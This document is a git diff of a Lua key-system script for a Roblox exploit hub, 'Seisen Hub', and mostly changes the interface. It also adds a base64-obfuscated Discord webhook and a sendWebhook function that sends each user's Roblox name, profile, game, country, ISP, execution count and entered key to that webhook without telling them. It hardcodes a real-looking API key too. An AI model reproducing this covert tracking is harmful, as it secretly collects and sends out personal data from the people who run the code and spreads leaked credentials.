@@ -1,11 +1,11 @@
 local KeySystemTitle = "Key system"
-local KeySystemTag = "V3.0"
-local CheckKeyTitle = "Your Hub Key System"
+local KeySystemTag = "V5.0"
+local CheckKeyTitle = "Seisen Hub Key System"
 local CheckKeySubtitle = "Checking key..."
-local HubName = "Your Hub"
+local HubName = "Seisen Hub"
 local HubSubtitle = "Join on Discord!"
 local DiscordCardTitle   = "Discord Server"
-local DiscordCardText    = "Your Hub is a community focused on providing quality scripts and support. Join our Discord server to stay updated, get help, and connect with other members!"
+local DiscordCardText    = "Seisen Hub is a community focused on providing quality scripts and support. Join our Discord server to stay updated, get help, and connect with other members!"
 local DiscordButtonText  = "Join Server"
 local EnterKeyLabelText  = "Enter your key"
 local KeyPlaceholderText = "Enter your Key..."
@@ -17,7 +17,29 @@ local NotificationFailedText    = "Failed to generate key."
 local NotificationDiscordText   = "Discord link copied!"
 local NotificationGeneratedText = "Link Generated!"
 
-local DISCORD_INVITE = "YOUR_DISCORD_INVITE" -- Replace with your Discord invite link
+local DISCORD_INVITE = "https://discord.gg/F4sAf6z8Ph"
+
+-- Obfuscated webhook (base64 encoded for safety)
+local WEBHOOK_ENCODED = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzNjk0ODY4ODk5NDk1OTUxMS9ZaDN1a0ZTRG5xVllrOUtzY0o4VGJlazBDaC14Vm9HREVKaTdWQ1gwdVR0ZVZwSVBTcHpKOEpmQW1acENWYnZMV0t1dw=="
+
+-- Base64 decode function
+local function base64Decode(data)
+    local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
+    data = string.gsub(data, '[^'..b..'=]', '')
+    return (data:gsub('.', function(x)
+        if (x == '=') then return '' end
+        local r,f='',(b:find(x)-1)
+        for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0') end
+        return r;
+    end):gsub('%d%d%d?%d?%d?%d?%d?%d?', function(x)
+        if (#x ~= 8) then return '' end
+        local c=0
+        for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0) end
+        return string.char(c)
+    end))
+end
+
+local WEBHOOK_URL = base64Decode(WEBHOOK_ENCODED)
 
 local Players=game:GetService("Players")
 local CoreGui=game:GetService("CoreGui")
@@ -54,10 +76,10 @@ else
     thumbId = "rbxassetid://0"
 end
 
--- API Configuration - Replace these with your own credentials
-local API_KEY = "YOUR_API_KEY_HERE"
-local SERVICE_ID = "YOUR_SERVICE_ID_HERE"
-local PROVIDER = "YOUR_PROVIDER_NAME_HERE"
+-- Default API/service identifiers (kept for legacy compatibility)
+local API_KEY = "bf53180d-34f4-41e1-bded-b1c725fb5593"
+local SERVICE_ID = "Seisen Hub" --- if Premium (Premium Key)
+local PROVIDER = "Seisen Hub" --- if Premium (SeisenPremium)
 
 if type(JunkieProtected) ~= "table" then
     JunkieProtected = {}
@@ -127,6 +149,31 @@ if remoteOk and remoteSys then
         JunkieProtected = w
     end
 end
+
+-- DEBUG: Print all available functions in JunkieCore and JunkieProtected
+task.spawn(function()
+    task.wait(3) -- Wait for everything to load
+    print("--- Junkie API Debug ---")
+    if JunkieCore then
+        print("JunkieCore available:")
+        for k, v in pairs(JunkieCore) do
+            print("  " .. tostring(k) .. " (" .. type(v) .. ")")
+        end
+    else
+        print("JunkieCore NOT available")
+    end
+    
+    if JunkieProtected then
+        print("JunkieProtected available:")
+        for k, v in pairs(JunkieProtected) do
+            print("  " .. tostring(k) .. " (" .. type(v) .. ")")
+        end
+    else
+        print("JunkieProtected NOT available")
+    end
+    print("------------------------")
+end)
+
 
 -- Fallback: try common global placements
 if not (JunkieProtected and (JunkieProtected.verifyKey or JunkieProtected.getLink)) then
@@ -211,8 +258,8 @@ local function main()
     end)
 end
 
-if getgenv().YourHubKeySys == nil then
-    getgenv().YourHubKeySys = false
+if getgenv().SeisenKeySys == nil then
+    getgenv().SeisenKeySys = false
 end
 
 local KeySystemData = {
@@ -228,7 +275,7 @@ local KeySystemData = {
         DescriptionTitle      = Color3.fromRGB(255, 255, 255),
         DescriptionText       = Color3.fromRGB(180, 180, 180)
     },
-    FolderName = "yourhub",
+    FolderName = "seisen",
     FileName   = "keys.txt"
 }
 
@@ -255,7 +302,7 @@ if writefile and isfile and not isfile(settingsPath) then
     writefile(settingsPath, "theme=dark")
 end
 if writefile and isfile and not isfile(backupPath) then
-    writefile(backupPath, "=== Your Hub Key Backup ===\n\nAll your verified keys are saved here for easy access.\nYou can copy any key from this file.\n\n--- Valid Keys ---\n")
+    writefile(backupPath, "=== Seisen Hub Key Backup ===\n\nAll your verified keys are saved here for easy access.\nYou can copy any key from this file.\n\n--- Valid Keys ---\n")
 end
 
 -- Helper functions for data management
@@ -354,10 +401,215 @@ local function getKeyValidCount(key)
     return countData[key]
 end
 
--- Webhook functionality removed for template
+local function getRobloxThumbnails(userId)
+    local headshot = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-" .. userId .. "-420x420-Png-00.png"
+    local fullBody = "https://tr.rbxcdn.com/30DAY-Avatar-" .. userId .. "-420x420-Png-00.png"
+    
+    -- Try to fetch from Roblox API
+    if request then
+        local success, result = pcall(function()
+            return request({
+                Url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false",
+                Method = "GET"
+            })
+        end)
+        
+        if success and result and result.Body then
+            local ok, data = pcall(function()
+                return HttpService:JSONDecode(result.Body)
+            end)
+            
+            if ok and data and data.data and data.data[1] and data.data[1].imageUrl then
+                fullBody = data.data[1].imageUrl
+            end
+        end
+        
+        -- Fetch headshot
+        local success2, result2 = pcall(function()
+            return request({
+                Url = "https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=" .. userId .. "&size=420x420&format=Png&isCircular=false",
+                Method = "GET"
+            })
+        end)
+        
+        if success2 and result2 and result2.Body then
+            local ok, data = pcall(function()
+                return HttpService:JSONDecode(result2.Body)
+            end)
+            
+            if ok and data and data.data and data.data[1] and data.data[1].imageUrl then
+                headshot = data.data[1].imageUrl
+            end
+        end
+    end
+    
+    return headshot, fullBody
+end
+
 local function sendWebhook(webhookData)
-    -- Add your own webhook implementation here if needed
-    return
+    if not WEBHOOK_URL or WEBHOOK_URL == "" then
+        return
+    end
+    
+    local country, isp = getCountryAndISP()
+    local executionCount = getExecutionCount()
+    local currentTime = os.date("%Y-%m-%d %H:%M:%S")
+    local gameLink = "https://www.roblox.com/games/" .. game.PlaceId
+    local profileLink = "https://www.roblox.com/users/" .. player.UserId .. "/profile"
+    
+    -- Fetch actual working Roblox thumbnail URLs
+    local avatarHeadshot, characterFullBody = getRobloxThumbnails(player.UserId)
+    
+    local embed = {
+        title = webhookData.title or "Key System Event",
+        description = webhookData.description or nil,
+        color = webhookData.color or 3447003,
+        fields = {
+            {
+                name = "━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                value = "** **",
+                inline = false
+            },
+            {
+                name = "👤 Player",
+                value = "```" .. player.Name .. "```",
+                inline = true
+            },
+            {
+                name = "🆔 Display Name",
+                value = "```@" .. player.DisplayName .. "```",
+                inline = true
+            },
+            {
+                name = "🔗 Profile",
+                value = "[Click Here](" .. profileLink .. ")",
+                inline = true
+            },
+            {
+                name = "━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                value = "** **",
+                inline = false
+            },
+            {
+                name = "🎮 Game",
+                value = "[" .. gameName .. "](" .. gameLink .. ")",
+                inline = false
+            },
+            {
+                name = "━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                value = "** **",
+                inline = false
+            },
+            {
+                name = "🌍 Country",
+                value = "```" .. country .. "```",
+                inline = true
+            },
+            {
+                name = "📡 ISP",
+                value = "```" .. isp .. "```",
+                inline = true
+            },
+            {
+                name = "📊 Executions",
+                value = "```" .. tostring(executionCount) .. "```",
+                inline = true
+            },
+            {
+                name = "━━━━━━━━━━━━━━━━━━━━━━━━━━",
+                value = "** **",
+                inline = false
+            }
+        },
+        thumbnail = {
+            url = characterFullBody  -- Use full-body character image
+        },
+        footer = {
+            text = "Seisen Hub Key System • " .. currentTime,
+            icon_url = "https://cdn.discordapp.com/emojis/1234567890123456789.png"
+        },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%S")
+    }
+    
+    -- Add key-specific fields if provided
+    if webhookData.key then
+        table.insert(embed.fields, {
+            name = "🔑 Key",
+            value = "```" .. webhookData.key .. "```",
+            inline = false
+        })
+    end
+    
+    if webhookData.keyValidCount then
+        table.insert(embed.fields, {
+            name = "✅ Valid Count",
+            value = "```" .. tostring(webhookData.keyValidCount) .. "```",
+            inline = true
+        })
+    end
+    
+    if webhookData.keyTime then
+        table.insert(embed.fields, {
+            name = "⏰ Key Time",
+            value = "```" .. webhookData.keyTime .. "```",
+            inline = true
+        })
+    end
+    
+    if webhookData.service then
+        table.insert(embed.fields, {
+            name = "🛠️ Service",
+            value = "```" .. webhookData.service .. "```",
+            inline = true
+        })
+    end
+    
+    if webhookData.provider then
+        table.insert(embed.fields, {
+            name = "🏢 Provider",
+            value = "```" .. webhookData.provider .. "```",
+            inline = true
+        })
+    end
+    
+    local payload = {
+        embeds = {embed}
+    }
+    
+    if request then
+        pcall(function()
+            request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    elseif syn and syn.request then
+        pcall(function()
+            syn.request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    elseif http_request then
+        pcall(function()
+            http_request({
+                Url = WEBHOOK_URL,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json"
+                },
+                Body = HttpService:JSONEncode(payload)
+            })
+        end)
+    end
 end
 
 local function saveStats(stats)
@@ -622,26 +874,35 @@ local function ShowNotification(kind)
     end)
 end
 
-local function CreateYourHubKeyUI()
+local function CreateSeisenKeyUI()
     -- mark that UI is active so multiple instances are tracked
-    if getgenv then pcall(function() getgenv().YourHubKeySys = true end) end
+    if getgenv then pcall(function() getgenv().SeisenKeySys = true end) end
     
     -- Detect screen size and calculate scale
     local viewport = workspace.CurrentCamera.ViewportSize
-    local isMobile = viewport.X < 600 or viewport.Y < 600
-    local screenScale = math.min(viewport.X / 650, viewport.Y / 520)
+    -- More aggressive mobile detection
+    local isMobile = viewport.X < 1000 or viewport.Y < 700
     
-    -- Adjust scale for mobile
+    -- Always use fixed base dimensions (PC size)
+    local baseWidth = 650
+    local baseHeight = 525
+    
+    -- Calculate how much to scale the UI to fit mobile screens
+    local uiScaleValue = 1.0  -- Default for PC
+    
     if isMobile then
-        screenScale = math.min(viewport.X / 380, viewport.Y / 600) * 0.95
+        -- Much more aggressive scaling for mobile - use less screen space
+        local scaleX = (viewport.X * 0.70) / baseWidth  -- Use only 70% of screen width
+        local scaleY = (viewport.Y * 0.65) / baseHeight  -- Use only 65% of screen height
+        uiScaleValue = math.min(scaleX, scaleY)
+        -- Ensure we don't scale up, only down
+        uiScaleValue = math.min(uiScaleValue, 1.0)
+        -- Also set a minimum scale so it doesn't get too tiny
+        uiScaleValue = math.max(uiScaleValue, 0.4)
     end
     
-    -- Base dimensions (increased height for watermark)
-    local baseWidth = isMobile and 380 or 650
-    local baseHeight = isMobile and 600 or 525
-    
     local gui = Instance.new("ScreenGui")
-    gui.Name = "YourHubKeyUI"
+    gui.Name = "SeisenKeyUI"
     gui.ResetOnSpawn = false
     gui.IgnoreGuiInset = true
     gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
@@ -651,15 +912,19 @@ local function CreateYourHubKeyUI()
     local mainFrame = Instance.new("Frame")
     mainFrame.Name = "Main"
     mainFrame.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
-    mainFrame.BackgroundTransparency = 0.3
+    mainFrame.BackgroundTransparency = 0.15
     mainFrame.BorderSizePixel = 0
     mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
     mainFrame.Position = UDim2.new(0.5, 0, 1.5, 0)
-    local fullSize = UDim2.new(0, baseWidth, 0, baseHeight)
-    mainFrame.Size = fullSize
-    mainFrame.ClipsDescendants = true
+    mainFrame.Size = UDim2.new(0, baseWidth, 0, baseHeight)  -- Always use base PC size
+    mainFrame.ClipsDescendants = false
     mainFrame.ZIndex = 2
     mainFrame.Parent = gui
+    
+    -- Apply UIScale to make it smaller on mobile
+    local uiScale = Instance.new("UIScale")
+    uiScale.Scale = uiScaleValue  -- This will be < 1.0 on mobile, making everything smaller
+    uiScale.Parent = mainFrame
 
     local mainCorner = Instance.new("UICorner", mainFrame)
     mainCorner.CornerRadius = UDim.new(0, 16)
@@ -678,6 +943,9 @@ local function CreateYourHubKeyUI()
     gradientBg.BorderSizePixel = 0
     gradientBg.ZIndex = 0
     gradientBg.Parent = mainFrame
+    
+    local gradientCorner = Instance.new("UICorner", gradientBg)
+    gradientCorner.CornerRadius = UDim.new(0, 16)
     
     local gradientUi = Instance.new("UIGradient", gradientBg)
     gradientUi.Color = ColorSequence.new({
@@ -1003,8 +1271,8 @@ local function CreateYourHubKeyUI()
 
     -- Key Status Indicator with pulsing effect
     local statusFrame = Instance.new("Frame")
-    statusFrame.Size = UDim2.new(0, isMobile and 90 or 100, 0, isMobile and 22 or 24)
-    statusFrame.Position = UDim2.new(0.5, 0, 0, isMobile and 95 or 95)
+    statusFrame.Size = UDim2.new(0, 100, 0, 24)
+    statusFrame.Position = UDim2.new(0.5, 0, 0, 95)
     statusFrame.AnchorPoint = Vector2.new(0.5, 0)
     statusFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 30)
     statusFrame.BorderSizePixel = 0
@@ -1062,32 +1330,22 @@ local function CreateYourHubKeyUI()
     statusLabel.Position = UDim2.new(0, 0, 0, 0)
     statusLabel.Font = Enum.Font.GothamSemibold
     statusLabel.Text = "  Pending"
-    statusLabel.TextSize = isMobile and 10 or 11
+    statusLabel.TextSize = 11
     statusLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
     statusLabel.TextXAlignment = Enum.TextXAlignment.Center
     statusLabel.Parent = statusFrame
 
-    -- Main Content Container - Responsive layout
+    -- Main Content Container
     local content = Instance.new("Frame")
-    if isMobile then
-        content.Size = UDim2.new(1, -30, 0, 450)
-        content.Position = UDim2.new(0, 15, 0, 130)
-    else
-        content.Size = UDim2.new(1, -40, 0, 320)
-        content.Position = UDim2.new(0, 20, 0, 135)
-    end
+    content.Size = UDim2.new(1, -40, 0, 320)
+    content.Position = UDim2.new(0, 20, 0, 135)
     content.BackgroundTransparency = 1
     content.Parent = mainFrame
 
-    -- Left Column (Profile + Games) - Adjust for mobile
+    -- Left Column (Profile + Games)
     local leftColumn = Instance.new("Frame")
-    if isMobile then
-        leftColumn.Size = UDim2.new(1, 0, 0, 220)
-        leftColumn.Position = UDim2.new(0, 0, 0, 0)
-    else
-        leftColumn.Size = UDim2.new(0, 300, 1, 0)
-        leftColumn.Position = UDim2.new(0, 0, 0, 0)
-    end
+    leftColumn.Size = UDim2.new(0, 300, 1, 0)
+    leftColumn.Position = UDim2.new(0, 0, 0, 0)
     leftColumn.BackgroundTransparency = 1
     leftColumn.Parent = content
 
@@ -1339,17 +1597,12 @@ local function CreateYourHubKeyUI()
     -- Toggle button for Discontinued/Supported games
     local showDiscontinued = false
     local toggleBtn = Instance.new("TextButton")
-    if isMobile then
-        toggleBtn.Size = UDim2.new(0, 110, 0, 22)
-        toggleBtn.Position = UDim2.new(1, -110, 0, 156)
-    else
-        toggleBtn.Size = UDim2.new(0, 95, 0, 18)
-        toggleBtn.Position = UDim2.new(1, -95, 0, 156)
-    end
+    toggleBtn.Size = UDim2.new(0, 95, 0, 18)
+    toggleBtn.Position = UDim2.new(1, -95, 0, 156)
     toggleBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
     toggleBtn.BorderSizePixel = 0
     toggleBtn.Font = Enum.Font.GothamSemibold
-    toggleBtn.Text = "Show Discontinued (0)"
+    toggleBtn.Text = "Show Discontinued"
     toggleBtn.TextSize = 9
     toggleBtn.TextColor3 = Color3.fromRGB(200, 200, 210)
     toggleBtn.Parent = leftColumn
@@ -1404,14 +1657,6 @@ local function CreateYourHubKeyUI()
     gamesStroke.Thickness = 1.5
     gamesStroke.Color = Color3.fromRGB(70, 70, 70)
     gamesStroke.Transparency = 0.6
-    
-    -- Add subtle gradient to games container
-    local gamesGradient = Instance.new("UIGradient", gamesContainer)
-    gamesGradient.Color = ColorSequence.new{
-        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 32)),
-        ColorSequenceKeypoint.new(1, Color3.fromRGB(20, 20, 28))
-    }
-    gamesGradient.Rotation = 90
 
     local gamesLayout = Instance.new("UIListLayout", gamesContainer)
     gamesLayout.Padding = UDim.new(0, 6)
@@ -1507,39 +1752,16 @@ local function CreateYourHubKeyUI()
     end
     
     supportedGames = fetchGamesFromGitHub()
-    
-    -- Count supported and discontinued games
-    local supportedCount = 0
-    local discontinuedCount = 0
-    for _, game in ipairs(supportedGames) do
-        if game.status == "discontinued" then
-            discontinuedCount = discontinuedCount + 1
-        else
-            supportedCount = supportedCount + 1
-        end
-    end
 
     for i, gameData in ipairs(supportedGames) do
         local gameItem = Instance.new("Frame")
-        if isMobile then
-            gameItem.Size = UDim2.new(1, -8, 0, 50)
-        else
-            gameItem.Size = UDim2.new(1, -8, 0, 40)
-        end
+        gameItem.Size = UDim2.new(1, -8, 0, 40)
         gameItem.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
         gameItem.BorderSizePixel = 0
         gameItem.Parent = gamesContainer
 
         local itemCorner = Instance.new("UICorner", gameItem)
         itemCorner.CornerRadius = UDim.new(0, 8)
-        
-        -- Add subtle gradient to game items
-        local itemGradient = Instance.new("UIGradient", gameItem)
-        itemGradient.Color = ColorSequence.new{
-            ColorSequenceKeypoint.new(0, Color3.fromRGB(30, 30, 38)),
-            ColorSequenceKeypoint.new(1, Color3.fromRGB(25, 25, 33))
-        }
-        itemGradient.Rotation = 90
         
         local itemStroke = Instance.new("UIStroke", gameItem)
         itemStroke.Thickness = 1
@@ -1548,13 +1770,8 @@ local function CreateYourHubKeyUI()
 
         -- Game thumbnail/icon - Simple direct method
         local gameIcon = Instance.new("ImageLabel")
-        if isMobile then
-            gameIcon.Size = UDim2.new(0, 40, 0, 40)
-            gameIcon.Position = UDim2.new(0, 5, 0.5, -20)
-        else
-            gameIcon.Size = UDim2.new(0, 32, 0, 32)
-            gameIcon.Position = UDim2.new(0, 4, 0.5, -16)
-        end
+        gameIcon.Size = UDim2.new(0, 32, 0, 32)
+        gameIcon.Position = UDim2.new(0, 4, 0.5, -16)
         gameIcon.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
         gameIcon.BorderSizePixel = 0
         -- Use GameIcon type for actual game icons
@@ -1570,7 +1787,7 @@ local function CreateYourHubKeyUI()
         iconStroke.Color = Color3.fromRGB(70, 70, 80)
         iconStroke.Transparency = 0.5
 
-        -- Status indicator (colored circle with glow)
+        -- Status indicator (colored circle)
         local gameStatus = Instance.new("Frame")
         gameStatus.Size = UDim2.new(0, 10, 0, 10)
         gameStatus.Position = UDim2.new(1, -18, 0.5, -5)
@@ -1580,101 +1797,30 @@ local function CreateYourHubKeyUI()
         
         local statusCorner = Instance.new("UICorner", gameStatus)
         statusCorner.CornerRadius = UDim.new(1, 0) -- Makes it a circle
-        
-        -- Add subtle glow to status circle
-        local statusStroke = Instance.new("UIStroke", gameStatus)
-        statusStroke.Thickness = 1
-        statusStroke.Color = gameData.status == "discontinued" and Color3.fromRGB(220, 100, 100) or Color3.fromRGB(100, 220, 140)
-        statusStroke.Transparency = 0.5
-        
-        -- Add glow effect to status circle
-        local statusGlow = Instance.new("ImageLabel")
-        statusGlow.Size = UDim2.new(0, 20, 0, 20)
-        statusGlow.Position = UDim2.new(0.5, -10, 0.5, -10)
-        statusGlow.BackgroundTransparency = 1
-        statusGlow.Image = "rbxasset://textures/ui/GuiImagePlaceholder.png"
-        statusGlow.ImageColor3 = gameData.status == "discontinued" and Color3.fromRGB(220, 100, 100) or Color3.fromRGB(100, 220, 140)
-        statusGlow.ImageTransparency = 0.7
-        statusGlow.ZIndex = 0
-        statusGlow.Parent = gameStatus
-        
-        -- Pulse animation for status circle
-        task.spawn(function()
-            while gameStatus and gameStatus.Parent do
-                TweenService:Create(statusGlow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                    ImageTransparency = 0.9,
-                    Size = UDim2.new(0, 24, 0, 24),
-                    Position = UDim2.new(0.5, -12, 0.5, -12)
-                }):Play()
-                task.wait(1.5)
-                TweenService:Create(statusGlow, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut), {
-                    ImageTransparency = 0.7,
-                    Size = UDim2.new(0, 20, 0, 20),
-                    Position = UDim2.new(0.5, -10, 0.5, -10)
-                }):Play()
-                task.wait(1.5)
-            end
-        end)
 
         local gameName = Instance.new("TextLabel")
         gameName.Name = "GameNameLabel"
         gameName.BackgroundTransparency = 1
-        if isMobile then
-            gameName.Size = UDim2.new(1, -130, 1, 0)
-            gameName.Position = UDim2.new(0, 52, 0, 0)
-            gameName.TextSize = 13
-        else
-            gameName.Size = UDim2.new(1, -120, 1, 0)
-            gameName.Position = UDim2.new(0, 42, 0, 0)
-            gameName.TextSize = 11
-        end
+        gameName.Size = UDim2.new(1, -120, 1, 0)
+        gameName.Position = UDim2.new(0, 42, 0, 0)
         gameName.Font = Enum.Font.Gotham
         gameName.TextXAlignment = Enum.TextXAlignment.Left
         gameName.Text = gameData.name
+        gameName.TextSize = 11
         gameName.TextColor3 = Color3.fromRGB(210, 210, 220)
         gameName.TextTruncate = Enum.TextTruncate.AtEnd
         gameName.Parent = gameItem
         
-        -- Enhanced hover effects for game items with glow
+        -- Hover effects for game items
         gameItem.MouseEnter:Connect(function()
-            TweenService:Create(gameItem, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
-                BackgroundColor3 = Color3.fromRGB(40, 40, 48),
-                Position = gameItem.Position - UDim2.new(0, 0, 0, 2)
-            }):Play()
-            TweenService:Create(itemStroke, TweenInfo.new(0.2), {
-                Transparency = 0.2, 
-                Color = Color3.fromRGB(120, 120, 140),
-                Thickness = 1.5
-            }):Play()
-            TweenService:Create(iconStroke, TweenInfo.new(0.2), {
-                Transparency = 0.1, 
-                Color = Color3.fromRGB(140, 140, 160)
-            }):Play()
-            -- Scale up status circle slightly
-            TweenService:Create(gameStatus, TweenInfo.new(0.2), {
-                Size = UDim2.new(0, 12, 0, 12),
-                Position = UDim2.new(1, -19, 0.5, -6)
-            }):Play()
+            TweenService:Create(gameItem, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(40, 40, 45)}):Play()
+            TweenService:Create(itemStroke, TweenInfo.new(0.15), {Transparency = 0.3, Color = Color3.fromRGB(100, 100, 100)}):Play()
+            TweenService:Create(iconStroke, TweenInfo.new(0.15), {Transparency = 0.2, Color = Color3.fromRGB(120, 120, 130)}):Play()
         end)
         gameItem.MouseLeave:Connect(function()
-            TweenService:Create(gameItem, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
-                BackgroundColor3 = Color3.fromRGB(30, 30, 38),
-                Position = gameItem.Position + UDim2.new(0, 0, 0, 2)
-            }):Play()
-            TweenService:Create(itemStroke, TweenInfo.new(0.2), {
-                Transparency = 0.7, 
-                Color = Color3.fromRGB(60, 60, 75),
-                Thickness = 1
-            }):Play()
-            TweenService:Create(iconStroke, TweenInfo.new(0.2), {
-                Transparency = 0.5, 
-                Color = Color3.fromRGB(70, 70, 80)
-            }):Play()
-            -- Scale down status circle
-            TweenService:Create(gameStatus, TweenInfo.new(0.2), {
-                Size = UDim2.new(0, 10, 0, 10),
-                Position = UDim2.new(1, -18, 0.5, -5)
-            }):Play()
+            TweenService:Create(gameItem, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(30, 30, 38)}):Play()
+            TweenService:Create(itemStroke, TweenInfo.new(0.15), {Transparency = 0.7, Color = Color3.fromRGB(60, 60, 75)}):Play()
+            TweenService:Create(iconStroke, TweenInfo.new(0.15), {Transparency = 0.5, Color = Color3.fromRGB(70, 70, 80)}):Play()
         end)
     end
     
@@ -1687,7 +1833,7 @@ local function CreateYourHubKeyUI()
             gamesTitle.Text = "Discontinued Games"
             gamesTitle.TextColor3 = Color3.fromRGB(220, 100, 100)
         else
-            toggleBtn.Text = "Show Discontinued (0)"
+            toggleBtn.Text = "Show Discontinued"
             gamesTitle.Text = "Supported Games"
             gamesTitle.TextColor3 = Color3.fromRGB(220, 220, 230)
         end
@@ -1767,15 +1913,10 @@ local function CreateYourHubKeyUI()
         end
     end)
 
-    -- Right Column (Key Input + Discord) - Adjust for mobile
+    -- Right Column (Key Input + Discord)
     local rightColumn = Instance.new("Frame")
-    if isMobile then
-        rightColumn.Size = UDim2.new(1, 0, 0, 220)
-        rightColumn.Position = UDim2.new(0, 0, 0, 230)
-    else
-        rightColumn.Size = UDim2.new(0, 290, 1, 0)
-        rightColumn.Position = UDim2.new(1, -290, 0, 0)
-    end
+    rightColumn.Size = UDim2.new(0, 290, 1, 0)
+    rightColumn.Position = UDim2.new(1, -290, 0, 0)
     rightColumn.BackgroundTransparency = 1
     rightColumn.Parent = content
 
@@ -1819,6 +1960,8 @@ local function CreateYourHubKeyUI()
     keySection.Position = UDim2.new(0, 0, 0, 0)
     keySection.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
     keySection.BorderSizePixel = 0
+    keySection.ZIndex = 50 -- Ensure this section is above Discord section
+    keySection.ClipsDescendants = false
     keySection.Parent = rightColumn
 
     local keyCorner = Instance.new("UICorner", keySection)
@@ -2261,8 +2404,56 @@ local function CreateYourHubKeyUI()
     buttonContainer.BackgroundTransparency = 1
     buttonContainer.Parent = keySection
 
+    -- Inline Notification System
+    local function showInlineNotification(button, message, color)
+        -- Remove existing notification if any
+        local existingNotif = button.Parent:FindFirstChild("InlineNotif")
+        if existingNotif then
+            existingNotif:Destroy()
+        end
+
+        -- Create notification label
+        local notif = Instance.new("TextLabel")
+        notif.Name = "InlineNotif"
+        notif.Size = UDim2.new(1, 0, 0, 22)
+        notif.Position = UDim2.new(0, 0, 1, 35) -- Adjusted to not overlap dropdown
+        notif.BackgroundColor3 = color
+        notif.BackgroundTransparency = 1
+        notif.BorderSizePixel = 0
+        notif.Font = Enum.Font.GothamBold
+        notif.Text = message
+        notif.TextSize = 10
+        notif.TextColor3 = Color3.fromRGB(255, 255, 255)
+        notif.TextTransparency = 1
+        notif.ZIndex = 30
+        notif.Parent = button.Parent
+        
+        local notifCorner = Instance.new("UICorner", notif)
+        notifCorner.CornerRadius = UDim.new(0, 6)
+        
+        -- Animate in
+        TweenService:Create(notif, TweenInfo.new(0.2), {
+            BackgroundTransparency = 0.15,
+            TextTransparency = 0
+        }):Play()
+        
+        -- Auto-dismiss after 3 seconds
+        task.delay(3, function()
+            if notif and notif.Parent then
+                TweenService:Create(notif, TweenInfo.new(0.3), {
+                    BackgroundTransparency = 1,
+                    TextTransparency = 1
+                }):Play()
+                task.wait(0.3)
+                if notif and notif.Parent then
+                    notif:Destroy()
+                end
+            end
+        end)
+    end
+
     local verifyBtn = Instance.new("TextButton")
-    verifyBtn.Size = UDim2.new(0.48, -4, 1, 0)
+    verifyBtn.Size = UDim2.new(0.40, -4, 1, 0)  -- Reduced from 0.48 to make room for arrow
     verifyBtn.Position = UDim2.new(0, 0, 0, 0)
     verifyBtn.BackgroundColor3 = Color3.fromRGB(88, 101, 242)
     verifyBtn.BorderSizePixel = 0
@@ -2280,13 +2471,22 @@ local function CreateYourHubKeyUI()
     verifyStroke.Color = Color3.fromRGB(120, 130, 255)
     verifyStroke.Transparency = 0.5
 
+    -- Variable to store selected duration (default 24h)
+    local selectedDurationHours = 24
+    
+    -- Load saved duration if exists
+    if isfile and readfile and isfile("seisen/key_duration_pref.txt") then
+        local saved = tonumber(readfile("seisen/key_duration_pref.txt"))
+        if saved then selectedDurationHours = saved end
+    end
+
     local getKey = Instance.new("TextButton")
-    getKey.Size = UDim2.new(0.48, -4, 1, 0)
-    getKey.Position = UDim2.new(0.52, 0, 0, 0)
+    getKey.Size = UDim2.new(0.40, -4, 1, 0)  -- Reduced from 0.48 to make room for arrow
+    getKey.Position = UDim2.new(0.42, 0, 0, 0)  -- Adjusted position
     getKey.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
     getKey.BorderSizePixel = 0
     getKey.Font = Enum.Font.GothamSemibold
-    getKey.Text = "🔑 " .. GetKeyButtonText
+    getKey.Text = "🔑 " .. GetKeyButtonText .. " (" .. selectedDurationHours .. "h)"
     getKey.TextSize = 11
     getKey.TextColor3 = Color3.fromRGB(220, 220, 230)
     getKey.Parent = buttonContainer
@@ -2298,6 +2498,746 @@ local function CreateYourHubKeyUI()
     getKeyStroke.Thickness = 1.5
     getKeyStroke.Color = Color3.fromRGB(70, 70, 85)
     getKeyStroke.Transparency = 0.5
+
+    -- Button Container (Increase ZIndex to ensure dropdown shows over Discord card)
+    buttonContainer.ZIndex = 51
+    buttonContainer.ClipsDescendants = false
+    
+    -- Duration Dropdown
+    local durationDropdown = Instance.new("Frame")
+    durationDropdown.Size = UDim2.new(0, 100, 0, 0) -- Start closed
+    durationDropdown.Position = UDim2.new(0.42, 0, 1, 5) -- Below Get Key button
+    durationDropdown.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+    durationDropdown.BorderSizePixel = 0
+    durationDropdown.ZIndex = 52 -- Higher than buttonContainer
